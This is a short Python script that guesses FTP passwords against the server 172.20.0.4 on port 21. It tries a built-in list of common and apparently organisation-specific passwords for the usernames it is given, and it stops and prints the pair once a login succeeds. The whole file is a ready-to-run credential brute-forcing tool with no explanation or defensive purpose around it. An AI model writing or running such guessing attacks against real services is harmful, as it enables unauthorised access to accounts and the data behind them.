#!/usr/bin/env python3
# Quick FTP password test against 172.20.0.4:21 (uses the OA FTP bucket, separate from SSH).
# usage: ftp_try.py <user1,user2,...>
import socket, sys, time

HOST="172.20.0.4"; PORT=21
PWS = ["fileserver123","P@ssword","fileserver","File@123","file123","123456","P@ssw0rd","admin123",
       "password","12345678","1qaz@WSX","fileserver@123","file@123","share123","backup123",
       "storage123","nas123","deeptech@123","sz123456","sunhao123","Fileserver@123","fileserver2024",
       "P@ssword!","Admin@123","ftp","ftp123","Ftp@123","user123","share","user","P@ssword123","123456789"]

def login(u, p, tmo=8):
    try:
        s = socket.create_connection((HOST, PORT), timeout=tmo); s.settimeout(tmo)
        f = s.makefile("rwb", buffering=0)
        b = f.readline().decode(errors="replace").strip()
        f.write(("USER %s\r\n" % u).encode()); r1 = f.readline().decode(errors="replace").strip()
        if r1.startswith("530"):
            s.close(); return "DENIED", r1
        f.write(("PASS %s\r\n" % p).encode()); r2 = f.readline().decode(errors="replace").strip()
        s.close()
        if r2.startswith("230"): return "HIT", r2
        return "NO", r2
    except Exception as e:
        return "ERR", type(e).__name__ + ":" + str(e)[:40]

users = sys.argv[1].split(",") if len(sys.argv) > 1 else ["fileserver"]
for u in users:
    for p in PWS:
        st, msg = login(u, p)
        print("%s %-4s %s/%s %s" % (time.strftime("%H:%M:%S"), st, u, p, msg[:40]), flush=True)
        if st == "HIT":
            print("FOUND %s / %s" % (u, p), flush=True); raise SystemExit
        if st == "DENIED":
            break
        if st == "ERR":
            time.sleep(3)
        else:
            time.sleep(1.0)

